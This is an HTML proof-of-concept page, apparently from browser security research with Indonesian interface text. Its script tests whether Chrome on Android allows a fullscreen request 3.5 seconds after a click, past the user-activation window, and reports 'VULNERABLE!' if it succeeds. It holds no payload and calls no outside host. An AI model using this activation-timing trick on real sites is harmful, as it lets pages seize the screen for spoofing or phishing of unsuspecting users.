<!DOCTYPE html>
<html>
<head>
    <title>Clean Proof: 3.5s Activation Leak</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #111; color: #eee; }
        #box { border: 2px solid #444; padding: 30px; display: inline-block; border-radius: 15px; }
        #timer { font-size: 48px; font-weight: bold; margin: 20px 0; color: #007bff; }
        #status { font-size: 18px; margin-bottom: 20px; }
        button { padding: 15px 30px; font-size: 20px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 8px; }
        .success { color: #28a745; font-weight: bold; }
        .fail { color: #dc3545; font-weight: bold; }
    </style>
</head>
<body>

<div id="box">
    <h2>Chrome Android Security Research</h2>
    <div id="status">Klik tombol lalu lepaskan HP anda.</div>
    <div id="timer">0ms</div>
    <button id="runTest">MULAI UJI (3.5 DETIK)</button>
</div>

<script>
    const btn = document.getElementById('runTest');
    const timerDisplay = document.getElementById('timer');
    const statusDisplay = document.getElementById('status');
    let start;

    btn.onclick = () => {
        start = performance.now();
        btn.style.display = 'none'; 
        statusDisplay.innerText = "SISTEM SEDANG BERJALAN... JANGAN SENTUH LAYAR!";
        const interval = setInterval(() => {
            const now = Math.round(performance.now() - start);
            timerDisplay.innerText = `${now}ms`;
        }, 10);
        setTimeout(() => {
            console.log("2000ms passed...");
            setTimeout(() => {
                const totalTime = Math.round(performance.now() - start);
                
                document.documentElement.requestFullscreen()
                .then(() => {
                    clearInterval(interval);
                    timerDisplay.innerText = `${totalTime}ms`;
                    statusDisplay.innerHTML = `<span class="success">VULNERABLE! Fullscreen berhasil dipicu pada ${totalTime}ms.</span>`;
                })
                .catch((e) => {
                    clearInterval(interval);
                    statusDisplay.innerHTML = `<span class="fail">GAGAL: ${e.message}</span>`;
                });

            }, 1500); 

        }, 2000);
    };
</script>
</body>
</html>
